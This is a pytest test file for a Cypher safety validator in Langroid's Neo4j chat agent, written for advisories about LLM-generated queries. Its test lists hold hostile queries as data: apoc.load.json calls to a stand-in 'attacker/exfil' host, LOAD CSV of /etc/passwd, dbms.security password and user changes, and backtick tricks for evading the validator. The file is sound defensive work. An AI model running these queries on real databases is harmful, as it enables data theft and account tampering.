"""Unit tests for the Cypher safety validator used by Neo4jChatAgent.

These cover GHSA-2pq5-3q89-j7cc: LLM-generated Cypher must not be able to write
or destroy data via the read (retrieval) path, nor reach code-execution /
file / network primitives, unless the operator opts in with
``allow_dangerous_operations=True``. The tests are pure-function (no live Neo4j
needed), mirroring the static proof-of-concept in the advisory.
"""

import pytest

from langroid.agent.special.neo4j.cypher_validator import (
    _strip_literals_and_comments,
    _unescape_backticked_names,
    validate_cypher_query,
)

# Read-only Cypher that must pass on the retrieval path.
READ_OK = [
    "MATCH (n) RETURN n",
    "MATCH (n:Person) WHERE n.age > 30 RETURN n.name ORDER BY n.name DESC",
    "MATCH (a)-[r]->(b) RETURN a, r, b LIMIT 10",
    "WITH 1 AS x UNWIND range(1, x) AS i RETURN i",
    "MATCH (n) WHERE n.created > 0 RETURN n",  # `.created`, not the CREATE clause
    # write keywords appearing only inside strings / comments / backticks:
    "MATCH (n) WHERE n.note = 'please CREATE a node' RETURN n",
    "MATCH (n) RETURN n // TODO: DELETE later",
    "MATCH (n) RETURN n /* no DELETE here */",
    "MATCH (n:`CREATE`) RETURN n",
]

# Queries that must be rejected on the read path (writes + dangerous prims).
READ_REJECT = [
    "CREATE (n:Person {name: 'x'})",
    "MATCH (n) DETACH DELETE n",
    "MATCH (n) DELETE n",
    "MATCH (n) SET n.x = 1",
    "MERGE (n:Person {id: 1})",
    "MATCH (n) REMOVE n.prop",
    "DROP CONSTRAINT foo",
    "MATCH (p) FOREACH (x IN p.items | SET x.flag = true)",
    "LOAD CSV WITH HEADERS FROM 'http://evil/x.csv' AS row RETURN row",
    "CALL apoc.load.json('http://evil') YIELD value RETURN value",
    "CALL dbms.security.listUsers()",
    "CALL db.labels()",
    "WITH 1 AS x RETURN apoc.text.format('%s', [x])",
]

# Ordinary writes that the creation path should allow.
WRITE_OK = [
    "CREATE (n:Person {name: 'x'})",
    "MATCH (n) DETACH DELETE n",
    "MERGE (n:Person {id: 1}) SET n.x = 1",
    "MATCH (n) REMOVE n.prop",
]

# Dangerous primitives that must be blocked even on the creation path.
WRITE_REJECT = [
    "CALL apoc.export.csv.all('out.csv', {})",
    "LOAD CSV FROM 'file:///etc/passwd' AS row CREATE (n {p: row[0]})",
    "CALL dbms.security.createUser('x', 'y', false)",
    "CREATE (n) SET n.v = apoc.util.sleep(1000)",
]


@pytest.mark.parametrize("query", READ_OK)
def test_read_path_allows_read_only(query: str) -> None:
    assert validate_cypher_query(query, is_write=False, allow_dangerous=False) is None


@pytest.mark.parametrize("query", READ_REJECT)
def test_read_path_rejects_writes_and_dangerous(query: str) -> None:
    assert (
        validate_cypher_query(query, is_write=False, allow_dangerous=False) is not None
    )


@pytest.mark.parametrize("query", WRITE_OK)
def test_write_path_allows_writes(query: str) -> None:
    assert validate_cypher_query(query, is_write=True, allow_dangerous=False) is None


@pytest.mark.parametrize("query", WRITE_REJECT)
def test_write_path_rejects_dangerous(query: str) -> None:
    assert (
        validate_cypher_query(query, is_write=True, allow_dangerous=False) is not None
    )


@pytest.mark.parametrize("query", READ_REJECT + WRITE_REJECT)
def test_allow_dangerous_bypasses_all_checks(query: str) -> None:
    assert validate_cypher_query(query, is_write=False, allow_dangerous=True) is None
    assert validate_cypher_query(query, is_write=True, allow_dangerous=True) is None


def test_strip_literals_and_comments() -> None:
    # keyword inside a string literal is blanked
    assert "CREATE" not in _strip_literals_and_comments(
        "MATCH (n) WHERE n.x = 'CREATE' RETURN n"
    )
    # keyword inside a line comment is blanked
    assert "DELETE" not in _strip_literals_and_comments("MATCH (n) RETURN n // DELETE")
    # keyword inside a block comment is blanked
    assert "DROP" not in _strip_literals_and_comments("RETURN 1 /* DROP TABLE */")
    # backtick identifier is blanked
    assert "MERGE" not in _strip_literals_and_comments("MATCH (n:`MERGE`) RETURN n")
    # real clause text is preserved
    assert "RETURN" in _strip_literals_and_comments("MATCH (n) RETURN n")


# ---------------------------------------------------------------------------
# Back-ticked procedure namespaces (GHSA-v5gj-pcf6-jjh7, and the identical
# earlier GHSA-h75w-m9jv-2c6v / GHSA-8c3r-3hgh-c8hv).
#
# Neo4j resolves `apoc` and apoc identically (openCypher EscapedSymbolicName),
# so back-ticking a namespace segment must not hide it from the procedure
# checks -- while back-ticked labels and property keys named after keywords
# must still be exempt, since that is what the scrubber is for.
# ---------------------------------------------------------------------------


BACKTICKED_DANGEROUS = [
    "CALL `apoc`.load.json('http://attacker/exfil')",
    "CALL `dbms`.security.changePassword('newpass')",
    "CALL `db`.schema.visualization()",
    "CALL `apoc`.`load`.`json`('http://attacker/exfil')",
    "CALL apoc.`load`.json('http://attacker/exfil')",
    # apoc functions are callable in expressions, not only after CALL.
    "RETURN `apoc`.text.join(['a'], ',')",
]


@pytest.mark.parametrize("query", BACKTICKED_DANGEROUS)
@pytest.mark.parametrize("is_write", [True, False])
def test_backticked_procedure_namespace_is_rejected(query: str, is_write: bool) -> None:
    rejection = validate_cypher_query(query, is_write=is_write, allow_dangerous=False)
    assert rejection is not None, f"backtick evasion slipped through: {query}"
    assert "REJECTED" in rejection


@pytest.mark.parametrize(
    "query",
    [
        # Labels and property keys legitimately named after keywords stay
        # back-ticked in real Cypher, and must not trip the write-clause check.
        "MATCH (n:`CREATE`) RETURN n",
        "MATCH (n:`DELETE`) RETURN n",
        "MATCH (n) RETURN n.`set`",
        "MATCH (n) RETURN n.`merge` AS m",
        # A dangerous-looking name inside a string literal is still inert.
        "MATCH (n:Person) WHERE n.name = 'apoc.load.json' RETURN n",
        "MATCH (n) RETURN n // CALL apoc.load.json",
        # A back-ticked name AFTER a dot is a property / map key, never the
        # head of a procedure namespace, so it must stay exempt. Unescaping it
        # would reject ordinary map access on a key named `apoc` or `dbms`.
        "WITH {apoc: {name: 'x'}} AS n RETURN n.`apoc`.name",
        "MATCH (n) RETURN n.`dbms`.version",
        "MATCH (n) RETURN n.`db`.schema",
    ],
)
def test_backticked_names_do_not_cause_false_positives(query: str) -> None:
    assert validate_cypher_query(query, is_write=False, allow_dangerous=False) is None


def test_backtick_normalization_preserves_offsets() -> None:
    """Unescaping must not shift character offsets, so spans stay aligned."""
    raw = "CALL `apoc`.load.json('u')"
    assert len(_unescape_backticked_names(raw)) == len(raw)


def test_allow_dangerous_still_bypasses_backtick_check() -> None:
    for q in BACKTICKED_DANGEROUS:
        assert validate_cypher_query(q, is_write=True, allow_dangerous=True) is None
